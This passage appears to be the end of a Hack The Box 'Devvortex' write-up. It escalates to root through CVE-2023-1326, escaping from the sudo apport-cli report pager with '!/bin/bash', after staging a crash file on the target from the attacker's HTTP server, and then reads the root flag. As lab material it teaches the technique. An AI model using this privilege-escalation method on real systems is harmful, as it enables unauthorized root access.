Please choose (S/E/V/K/I/C): v
!id
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)

This fixes CVE-2023-1326.

Bug: https://launchpad.net/bugs/2016023
Signed-off-by: Benjamin Drung <benjamin.drung@canonical.com>
```

> http://web.mit.edu/broder/Public/xserver-xorg-video-intel-oneiric-kernel.crash

```c
┌──(user㉿kali)-[/media/…/htb/machines/devvortex/serve]
└─$ wget http://web.mit.edu/broder/Public/xserver-xorg-video-intel-oneiric-kernel.crash
--2023-11-25 19:39:30--  http://web.mit.edu/broder/Public/xserver-xorg-video-intel-oneiric-kernel.crash
Resolving web.mit.edu (web.mit.edu)... 23.210.114.10, 2a02:26f0:1700:18f::255e, 2a02:26f0:1700:1ab::255e
Connecting to web.mit.edu (web.mit.edu)|23.210.114.10|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4186486 (4.0M) [text/plain]
Saving to: ‘xserver-xorg-video-intel-oneiric-kernel.crash’

xserver-xorg-video-intel-oneiric-kernel.crash              100%[========================================================================================================================================>]   3.99M  20.1MB/s    in 0.2s    

2023-11-25 19:39:30 (20.1 MB/s) - ‘xserver-xorg-video-intel-oneiric-kernel.crash’ saved [4186486/4186486]
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/devvortex/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
logan@devvortex:/tmp$ wget http://10.10.14.42/xserver-xorg-video-intel-oneiric-kernel.crash
--2023-11-25 19:40:03--  http://10.10.14.42/xserver-xorg-video-intel-oneiric-kernel.crash
Connecting to 10.10.14.42:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4186486 (4.0M) [application/octet-stream]
Saving to: ‘xserver-xorg-video-intel-oneiric-kernel.crash’

xserver-xorg-video-intel-oneiric-kernel.crash              100%[========================================================================================================================================>]   3.99M  4.25MB/s    in 0.9s    

2023-11-25 19:40:04 (4.25 MB/s) - ‘xserver-xorg-video-intel-oneiric-kernel.crash’ saved [4186486/4186486]
```

```c
logan@devvortex:/tmp$ sudo /usr/bin/apport-cli -c /tmp/xserver-xorg-video-intel-oneiric-kernel.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (4.1 MB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
```

```c
!/bin/bash
```

```c
root@devvortex:/tmp#
```

## root.txt

```c
root@devvortex:/tmp# cat /root/root.txt
ab56a32c8e35719f4dcbfecc552ab4c9
```
